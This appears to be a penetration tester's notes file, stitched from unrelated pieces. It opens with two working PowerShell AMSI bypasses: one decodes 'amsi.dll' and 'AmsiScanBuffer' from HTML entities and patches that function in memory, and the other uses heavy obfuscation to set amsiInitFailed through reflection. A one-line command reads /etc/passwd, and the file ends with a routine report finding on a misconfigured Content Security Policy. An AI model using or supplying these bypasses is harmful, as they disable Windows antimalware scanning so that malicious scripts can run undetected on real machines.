# AMSI-Bypass
$ZQCUW = @" 
using System;
using System.Runtime.InteropServices; 
public class ZQCUW { 
	[DllImport("kernel32")] 
	public static extern IntPtr GetProcAddress(IntPtr hModule, string procName); 
	[DllImport("kernel32")] 
	public static extern IntPtr LoadLibrary(string name); 
	[DllImport("kernel32")] 
	public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect); 
} 

"@ 

Add-Type $ZQCUW 

$BBWHVWQ = [ZQCUW]::LoadLibrary("$([SYstem.Net.wEBUtIlITy]::HTmldecoDE('&#97;&#109;&#115;&#105;&#46;&#100;&#108;&#108;'))") 
$XPYMWR = [ZQCUW]::GetProcAddress($BBWHVWQ, "$([systeM.neT.webUtility]::HtMldECoDE('&#65;&#109;&#115;&#105;&#83;&#99;&#97;&#110;&#66;&#117;&#102;&#102;&#101;&#114;'))") 
$p = 0 
[ZQCUW]::VirtualProtect($XPYMWR, [uint32]5, 0x40, [ref]$p) 
$TLML = "0xB8" 
$PURX = "0x57" 
$YNWL = "0x00" 
$RTGX = "0x07" 
$XVON = "0x80" 
$WRUD = "0xC3" 
$KTMJX = [Byte[]] ($TLML, $PURX, $YNWL, $RTGX, + $XVON, + $WRUD) 
[System.Runtime.InteropServices.Marshal]::Copy($KTMJX, 0, $XPYMWR, 6)

==========================================================================
grep "^root:" /etc/passwd | cut -f4 -d: 

S`eT-It`em('V'+'aR'+'IA'+('blE:1'+'q2')+('uZ'+'x'))([TYpE]("{1}{0}"-F'F','rE'));(Get-varI`A`BLE(('1Q'+'2U')+'zX')-VaL)."A`ss`Embly"."GET`TY`Pe"(("{6}{3}{1}{4}{2}{0}{5}"-f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')))."g`etf`iElD"(("{0}{2}{1}"-f('a'+'msi'),'d',('I'+'nitF'+'aile')),("{2}{4}{0}{1}{3}"-f('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'))."sE`T`VaLUE"(${n`ULl},${t`RuE})


=============================================================

### Misconfigured CSP

**Description**: The Content Security Policy (CSP) is misconfigured, with only `frame-ancestors 'self'` set, while critical directives like `object-src` and `script-src` are missing. This incomplete configuration leaves the application vulnerable to various attacks, such as cross-site scripting (XSS) and plugin-based attacks.

**Impact**: Without `script-src`, the application is exposed to the risk of executing malicious scripts, leading to XSS attacks. The absence of `object-src` means potentially dangerous plugins and embedded content can be loaded, increasing the risk of malicious code execution and data breaches.

**Remediation**: Update the CSP to include comprehensive directives. Set `script-src 'self'` to restrict script sources and `object-src 'none'` to block all plugin content. Regularly review and update the CSP to address new threats and vulnerabilities.

**Reference**:
- [OWASP Content Security Policy](https://owasp.org/www-project-secure-headers/#content-security-policy)
- [Mozilla Developer Network - CSP](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)

**One-liner recommendation**: "It is recommended to fully configure CSP by setting `script-src` and `object-src` directives to enhance security."
